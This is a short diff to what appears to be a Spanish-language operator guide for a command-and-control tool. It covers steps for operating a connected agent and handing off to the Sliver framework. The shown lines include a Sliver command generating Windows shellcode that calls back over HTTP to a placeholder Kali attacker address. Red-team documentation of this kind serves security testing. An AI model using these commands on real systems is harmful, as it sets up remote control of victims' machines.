@@ -721,7 +721,7 @@ PASO 5 — Esperar conexión y operar
   c2 [abc12345]> sleep 30 10
 
 PASO 6 — Handoff a Sliver (stage 2)
-  # En Sliver:
+  # En el entorno externo:
   sliver > generate --http <IP_KALI>:8888 --format shellcode --os windows --arch amd64 --save /tmp/sliver.bin
 
   # En c2:
